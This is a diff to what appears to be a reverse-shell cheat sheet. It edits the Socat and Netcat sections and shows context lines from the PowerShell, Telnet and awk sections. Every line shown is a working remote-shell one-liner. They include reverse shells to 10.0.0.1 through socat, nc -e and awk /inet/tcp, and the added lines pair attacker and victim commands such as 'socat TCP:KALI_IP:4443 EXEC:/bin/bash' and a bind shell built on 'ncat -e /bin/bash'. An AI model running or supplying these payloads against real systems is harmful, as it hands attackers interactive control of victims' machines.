@@ -55,9 +55,13 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 ### Socat
 ```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
-
 #Windows
 socat.exe -d -d TCP4:10.0.0.1:4444 EXEC:'cmd.exe',pipes
+
+#Kali: 
+socat -d -d TCP-LISTEN:4443,fork STDOUT
+#Victim: 
+socat TCP:KALI_IP:4443 EXEC:/bin/bash
 ```
 
 ### Telnet
@@ -73,6 +77,11 @@ awk 'BEGIN {{s = "/inet/tcp/0/10.0.0.1/4444"; while(42) {{ do{{ printf "shell>" 
 ### Netcat
 ```bash
 nc -e /bin/sh 10.0.0.1 1234
+
+#Victim: 
+ncat -lvnp 1234 -e /bin/bash
+#Kali: 
+nc VICTIM_IP 1234
 ```
 
 ### Python
